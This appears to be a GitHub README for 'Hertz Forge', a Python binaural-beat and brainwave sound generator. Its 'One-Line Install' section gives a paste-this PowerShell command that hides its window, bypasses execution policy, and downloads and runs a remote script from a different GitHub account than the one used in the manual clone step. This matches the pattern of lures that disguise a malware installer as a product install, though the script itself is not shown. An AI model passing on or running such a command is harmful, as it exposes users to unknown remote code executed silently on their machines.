

# Hertz Forge

Brainwave Entrainment Sound Generator with binaural beats, amplitude modulation,
bilateral panning and frequency modulation.

![License](https://img.shields.io/badge/license-MIT-blue)
![Python](https://img.shields.io/badge/python-3.9+-brightgreen)
![Platform](https://img.shields.io/badge/platform-Windows-lightgrey)

## One-Line Install

Copy and paste into PowerShell:

```
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/seuyh/hertz-forge/refs/heads/main/install.ps1 | iex"
```

This will:
- Download Hertz Forge to `%APPDATA%\HertzForge`
- Install Python 3 if missing (via winget)
- Install dependencies (`numpy`, `sounddevice`)
- Create a desktop shortcut
- Launch the app

## Manual Install

```bash
git clone https://github.com/IdanTheMan/hertz-forge.git
cd hertz-forge
pip install -r requirements.txt
python run.py
```

## Features

| Feature | Description |
|---|---|
| **Carrier Frequency** | 40–1000 Hz with sine, triangle, sawtooth, or square wave |
| **Brainwave Frequency** | 0–100 Hz δ θ α β γ |
| **Amplitude Modulation** | Pulse depth from flat to full on/off |
| **Bilateral Panning** | Crossfade at envelope trough for spatial effects |
| **Binaural Beats** | Pure sine tones L/R, amplitude-modulated with carrier envelope |
| **Frequency Modulation** | Sweep range around carrier frequency |
| **WAV Export** | Custom duration (HH:MM:SS), saves stereo WAV |
| **Live Updates** | All parameter changes apply instantly to audio |

## Requirements

- Windows 10 / 11
- Python 3.9+
- Audio output device

Dependencies are listed in `requirements.txt` and installed automatically.

## Project Structure

```
hertz-forge/
├── README.md              # This file
├── requirements.txt       # Python dependencies
├── install.ps1            # PowerShell one-click installer
├── run.py                 # Entry point (direct execution)
├── run_playlist.py
└── hertz_forge/           # Main package
    ├── __init__.py        # Package marker
    ├── constants.py       # Colours, band labels, presets
    ├── audio.py           # Audio engine & device discovery
    ├── widgets.py         # SpinEntry custom widget
    ├── gui.py             # Full GUI application
    └── main.py            # Module entry point (python -m)
└── playlist_forge/
    ├── __init__.py
    ├── engine.py
    ├── gui.py
    └── main.py
```

## Usage

### Running

```bash
# Direct
python run.py

# As module
python -m hertz_forge.main
```

### PyCharm

Set `run.py` as the run target, or right-click it and select Run.

### Exporting WAV

1. Set the export duration using the HH:MM:SS spinners (or click a preset)
2. Click **Export…**
3. Choose a save location
4. Wait for the status bar to confirm




